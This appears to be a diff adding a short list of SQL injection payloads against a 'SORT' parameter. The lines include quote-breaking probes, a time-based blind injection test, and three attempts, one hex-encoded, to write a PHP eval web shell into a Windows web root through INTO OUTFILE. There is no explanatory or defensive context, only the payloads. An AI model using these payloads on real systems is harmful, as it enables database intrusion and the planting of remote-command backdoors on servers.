@@ -1,0 +1,8 @@
+SORT:1
+SORT:1' and ;1
+SORT:1' and  '1
+SORT:1' and '1
+SORT:1' and if(length(database())>5,sleep(1),1) and '1
+SORT:1' and select '<?php @eval($_POST["cmd"]);?>' into outfile  'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' and '1
+SORT:1' and  into outfile  'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' lines terminated by  '<?php @eval($_POST["cmd"]);?>' and '1
+SORT:1' and  into outfile  'D:\\phpstudy\\PHPTutorial\\WWW\\x.php' lines terminated by 0x3c3f70687020406576616c28245f504f53545b22636d64225d293b3f3e  and '1
